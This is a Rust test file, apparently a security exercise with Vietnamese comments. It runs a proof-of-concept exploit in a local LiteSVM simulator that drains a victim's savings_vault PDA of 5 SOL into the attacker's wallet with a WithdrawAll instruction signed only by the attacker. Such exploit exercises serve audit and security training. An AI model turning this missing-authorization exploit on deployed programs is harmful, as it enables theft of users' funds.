use litesvm::LiteSVM;
use savings_vault::{vault_pda, VaultInstruction};
use solana_sdk::{
    account::Account,
    instruction::{AccountMeta, Instruction},
    pubkey::Pubkey,
    signature::{Keypair, Signer},
    transaction::Transaction,
};

#[test]
fn exploit() {
    let mut svm = LiteSVM::new();
    let program_id = Pubkey::new_unique();
    svm.add_program_from_file(program_id, "target/deploy/savings_vault.so")
        .unwrap();

    let victim = Keypair::new();
    let attacker = Keypair::new();
    svm.airdrop(&attacker.pubkey(), 1_000_000_000).unwrap();

    // Vault của nạn nhân, do program sở hữu, đang giữ 5 SOL.
    let (victim_vault, _) = vault_pda(&program_id, &victim.pubkey());
    svm.set_account(
        victim_vault,
        Account {
            lamports: 5_000_000_000,
            data: vec![],
            owner: program_id,
            executable: false,
            rent_epoch: 0,
        },
    )
    .unwrap();

    let before = svm.get_account(&attacker.pubkey()).unwrap().lamports;

    // ------------------------------------------------------------------
    // Viết code tấn công ở đây: attacker rút sạch vault của victim về ví
    // mình. Chỉ được ký bằng `attacker`.
    // ------------------------------------------------------------------
    let ix = Instruction {
        program_id,
        accounts: vec![
            AccountMeta::new_readonly(attacker.pubkey(), true),
            AccountMeta::new(victim_vault, false),
            AccountMeta::new(attacker.pubkey(), false),
        ],
        data: borsh::to_vec(&VaultInstruction::WithdrawAll).unwrap(),
    };
    svm.send_transaction(Transaction::new_signed_with_payer(
        &[ix],
        Some(&attacker.pubkey()),
        &[&attacker],
        svm.latest_blockhash(),
    ))
    .unwrap();

    // Account 0 lamports bị LiteSVM dọn đi, nên coi như đã rút sạch nếu không còn tồn tại.
    let vault_after = svm.get_account(&victim_vault).map(|a| a.lamports).unwrap_or(0);
    assert_eq!(vault_after, 0, "vault chưa bị rút sạch");
    let after = svm.get_account(&attacker.pubkey()).unwrap().lamports;
    assert!(after > before + 4_900_000_000, "attacker chưa nhận được SOL của victim");
}
